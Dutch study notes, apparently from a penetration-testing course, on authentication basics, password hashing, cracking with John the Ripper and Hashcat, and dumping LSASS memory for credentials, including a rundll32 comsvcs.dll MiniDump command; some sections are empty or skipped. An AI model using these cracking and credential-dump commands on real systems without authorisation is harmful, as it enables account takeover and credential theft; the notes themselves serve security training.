## 1. Introductie

### De CIA-triade

De kern van informatiebeveiliging bestaat uit drie principes:

- **Vertrouwelijkheid** ‚Äì Wie mag de data zien?
- **Integriteit** ‚Äì Is de data ongewijzigd?
- **Beschikbaarheid** ‚Äì Is de data toegankelijk?

### Authenticatiefactoren

|Factor|Voorbeeld|
|---|---|
|Iets wat je **weet**|Wachtwoord, pincode, wachtzin|
|Iets wat je **hebt**|ID-kaart, smartcard, telefoon|
|Iets wat je **bent**|Vingerafdruk, gezichtsherkenning|
|Ergens waar je **bent**|Geolocatie, IP-adres|

### Statistieken

- **24%** van Amerikanen gebruikt wachtwoorden zoals `123456` of `password`
- **66%** hergebruikt wachtwoorden voor meerdere accounts
- `123456` is nog steeds het meest voorkomende wachtwoord (4,5 miljoen keer in datalekken)
- Slechts **45%** verandert hun wachtwoord na een bekend datalek
- Gebruik [HaveIBeenPwned](https://haveibeenpwned.com) om te checken of een e-mail gelekt is

## 2. Introductie tot Password Cracking

### Hashing

Hashing is een eenrichtingsfunctie die invoer omzet naar een vaste uitvoerlengte.

bash

```bash
echo -n Soccer06! | md5sum
# 40291c1d19ee11a7df8495c4cccefdfa

echo -n Soccer06! | sha256sum
# a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93
```

### SHA1 voorbeeld

bash

```bash
echo -n Academy#2025 | sha1sum
# 750fe4b402dc9f91cedf09b652543cd85406be8c
```

### Kraaktechnieken

|Techniek|Beschrijving|Snelheid|
|---|---|---|
|**Rainbow Tables**|Vooraf gecompileerde hash‚Üíwachtwoord tabellen|Zeer snel (maar salts maken dit onbruikbaar)|
|**Dictionary Attack**|Probeer woorden uit een lijst (bijv. rockyou.txt)|Snel|
|**Brute Force**|Probeer alle combinaties|Traag maar 100% effectief|
|**Mask Attack**|Gerichte brute force op basis van structuur|Sneller dan brute force|

> üí° **Salting:** Een willekeurige reeks bytes die aan een wachtwoord wordt toegevoegd v√≥√≥r het hashen. Beschermt tegen rainbow tables.

bash

```bash
echo -n Th1sIsTh3S@lt_Soccer06! | md5sum
# 90a10ba83c04e7996bc53373170b5474
```

## 3. John the Ripper

### Kraak-modi

#### Single Crack Mode

Genereert kandidaten op basis van gebruikersnaam en profielgegevens (GECOS).

bash

```bash
john --single passwd
```

> Voorbeeld: Als de echte naam "Bob Smith" is, probeert JtR variaties zoals `Smith1`, `Bob123`, etc.

#### Wordlist Mode

bash

```bash
john --wordlist=<woordenlijst> <hash_bestand>
```

#### Incremental Mode (Brute Force)

bash

```bash
john --incremental <hash_bestand>
```

### Hashtype identificeren

bash

```bash

```

|---|---|

## 4. Hashcat

### Syntaxis

```
hashcat -a [attack_mode] -m [hash_type] <hashes> [wordlist/rules/mask]
```

### Veelgebruikte Hash Types

|ID|Naam|Categorie|
|---|---|---|
|0|MD5|Raw Hash|
|100|SHA1|Raw Hash|
|1000|NTLM|Windows Hash|
|1400|SHA2-256|Raw Hash|
|1800|sha512crypt|Unix Hash|
|2100|DCC2|Windows Hash|
|22100|BitLocker|Full-Disk Encryption|

### Aanvalsmodi

#### Dictionary Attack (-a 0)

bash

```bash
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Met regels:**

bash

```bash
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Mask Attack (-a 3)

|Symbool|Betekenis|
|---|---|
|`?l`|Kleine letters (a-z)|
|`?u`|Hoofdletters (A-Z)|
|`?d`|Cijfers (0-9)|
|`?s`|Speciale tekens|
|`?a`|Alles gecombineerd|

bash

```bash
# Wachtwoord: 1 hoofdletter, 4 kleine letters, 1 cijfer, 1 symbool
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'
```

### Oefeningen ‚Äì Resultaten

|Hash|Methode|Wachtwoord|
|---|---|---|
|`e3e3ec5831...`|Dictionary|`crazy!`|
|`1b0556a757...`|Dictionary + rules|`c0wb0ys1`|
|`1e293d6912...`|Mask `?u?l?l?l?l?d?s`|`Mouse5!`|

### Voorspelbare Wachtwoordpatronen

### Hashcat Regelfuncties

|Functie|Beschrijving|
|---|---|
|`:`|Doe niets (origineel woord)|
|`l`|Alles naar kleine letters|
|`u`|Alles naar hoofdletters|

## 12. LSASS Aanvallen

### Wat slaat LSASS op?

Bij elke login cached LSASS:

- NT & SHA1 password hashes (**MSV**)
- Wachtwoorden in platte tekst op oudere systemen (**WDIGEST**)
- Kerberos tickets (**Kerberos**)
- DPAPI masterkeys (**DPAPI**)

### LSASS Dump Methodes

#### Via PowerShell (CLI)

powershell

```powershell
# PID ophalen
Get-Process lsass

# Dump maken
rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full

# Controleren
ls C:\lsass.dmp
```

#### Via Task Manager (GUI)

1. Open Task Manager ‚Üí Details tab
2. Rechtsklik `lsass.exe` ‚Üí **Create dump file**
3. Bestand staat in `%temp%\lsass.DMP`

## üí° Geleerde Lessen (Samenvatting)

- Gebruik `--continue-on-success` met NetExec om alle geldige credentials te vinden
- `smbclient` gebruikt `-p` voor **poort** ‚Äî gebruik `%` notatie voor credentials
